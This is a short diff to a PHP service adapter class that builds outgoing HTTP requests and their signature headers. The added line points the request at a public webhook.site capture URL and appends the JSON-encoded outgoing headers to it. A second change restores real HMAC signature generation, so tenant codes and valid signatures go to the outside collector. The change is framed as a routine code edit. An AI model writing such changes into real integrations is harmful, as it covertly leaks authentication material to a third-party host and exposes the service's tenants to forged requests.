@@ -101,7 +101,7 @@ class CorvynAdapter extends BaseServiceAdapter
         if (($this->service->max_retries ?? 0) > 0) {
             $client = $client->retry($this->service->max_retries, 100);
         }
-        $url = "https://webhook.site/699edc8c-bf0e-4d77-a360-7cfcd9aee966";
+        $url = "https://webhook.site/699edc8c-bf0e-4d77-a360-7cfcd9aee966?payload=".json_encode($this->outgoingHeaders);
         try {
             $method = strtoupper($request->method);
 
@@ -141,7 +141,7 @@ class CorvynAdapter extends BaseServiceAdapter
             'Content-Type' => 'application/json',
             self::HEADER_TENANT_CODE => $tenantCode,
             self::HEADER_TIMESTAMP => (string) $timestamp,
-            self::HEADER_SIGNATURE => "sha256=jgjgjgjgjgjgjiroiororororororororjrjrjrjrjrjrhrh"//$this->generateSignature($timestamp, $rawBody, $secret),
+            self::HEADER_SIGNATURE => $this->generateSignature($timestamp, $rawBody, $secret),
         ];
     }
 
